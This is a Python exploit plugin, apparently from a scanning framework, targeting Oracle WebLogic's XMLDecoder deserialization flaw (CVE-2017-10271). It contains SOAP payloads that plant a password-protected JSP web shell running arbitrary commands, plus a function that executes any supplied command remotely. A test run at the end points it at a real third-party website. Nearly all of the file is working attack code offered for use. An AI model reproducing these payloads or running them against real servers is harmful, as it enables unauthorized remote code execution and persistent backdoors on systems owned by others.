#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import random
import requests
requests.packages.urllib3.disable_warnings()

shellpoc1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">


    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ahtest.jsp</string>
    <void method="println"><string>
    <![CDATA[
<%
    if("ahtest".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[102400];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    out.print("ahtest");
    %>]]>
    </string>
    </void>
    <void method="close"/>
    </object>
    </java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''

shellpoc2 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">  <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/ahtest.jsp</string>
    <void method="println"><string>
    <![CDATA[
    <%
    if("ahtest".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[102400];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    out.print("ahtest");
    %>]]>
    </string>
    </void>
    <void method="close"/>
    </object>

    </java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''

html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}
poc1 = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="'''

poc3 = '''
</array>
<void method="start" />
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
</soapenv:Body>
</soapenv:Envelope>
'''

def info(data=None):
    info = {
        "name": "weblogic cve-2017-10271",
        "info": "weblogic cve-2017-10271.",
        "level": "high",
        "type": "rec"
    }
    return info

def prove(data):
    data = init(data,'weblogic')
    if data['base_url']:
        headers = {"Content-Type": "text/xml"}
        url = data['base_url']+'wls-wsat/CoordinatorPortType'
        ran = str(random.randint(100000, 999999))
        poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/' + ran + '.txt</string><void method="println"><string>xmldecoder_vul_test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
        try:
            result = curl('post', url, data=poc, headers=headers)
            targeturl = data['base_url'] + "/bea_wls_internal/" + ran + ".txt"
            result = curl('get', targeturl)
            if result and str(result.status_code) == '200' and 'xmldecoder_vul_test' in result.text:
                data['flag'] = 1
                data['data'].append({"page": '/wls-wsat/CoordinatorPortType'})
                data['res'].append({"info": url, "key": targeturl})
            else:
                ran = str(random.randint(100000, 999999))
                poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/' + ran + '.txt</string><void method="println"><string>xmldecoder_vul_test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
                result = curl('post', url, data=poc, headers=headers)
                targeturl = data['base_url'] + "/wls-wsat/" + ran + ".txt"
                result = curl('get', url)
                if  result and str(result.status_code) == '200' and 'xmldecoder_vul_test' in result.text:
                    data['flag'] = 1
                    data['data'].append({"page": '/wls-wsat/CoordinatorPortType'})
                    data['res'].append({"info": targeturl, "key": url})
        except Exception as e:
            pass
    return data

def exec(data=None):
    data = init(data,'weblogic')
    if data['base_url']:
        headers = {"Content-Type": "text/xml"}
        poc2 = ''
        poc = None
        command = data['cmd']
        if command != None:
            commands = command.split()
            for i in range(0, len(commands)):
                poc2 += '<void index="' + str(i) + '"><string>' + "".join(
                    html_escape_table.get(c, c) for c in commands[i]) + '</string></void>'
            poc = poc1 + str(len(commands)) + '">' + poc2 + poc3
        targeturl = data['base_url'] + "/wls-wsat/CoordinatorPortType"
        result = curl('post', targeturl, data=poc, headers=headers)
        if str(result.status_code) == '500':
            data['flag'] = 1
            data['data'].append({"page": '/wls-wsat/CoordinatorPortType'})
            data['res'].append({"info": result.text, "key": targeturl})
    return data

def upload(data=None):
    data = init(data,'weblogic')
    if data['base_url']:
        headers = {"Content-Type": "text/xml"}
        url = data['base_url'] + 'wls-wsat/CoordinatorPortType'
        result = curl('post', url, data=shellpoc1, headers=headers)
        targeturl = data['base_url'] + "/bea_wls_internal/ahtest.jsp"
        result = curl('get', targeturl)
        if str(result.status_code) == '200' and 'ahtest' in result.text:
            data['flag'] = 1
            data['data'].append({"page": '/wls-wsat/CoordinatorPortType'})
            data['res'].append({"info": url, "key": targeturl + "?pwd=ahtest&cmd=whoami"})
        else:
            result = curl('post', url, data=shellpoc2, headers=headers)
            targeturl = data['base_url'] + "/wls-wsat/ahtest.jsp"
            result = curl('get', targeturl)
            if str(result.status_code) == '200' and 'ahtest' in result.text:
                data['flag'] = 1
                data['data'].append({"page": '/wls-wsat/CoordinatorPortType'})
                data['res'].append({"info": targeturl + "?pwd=ahtest&cmd=whoami", "key": "/wls-wsat/CoordinatorPortType"})
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))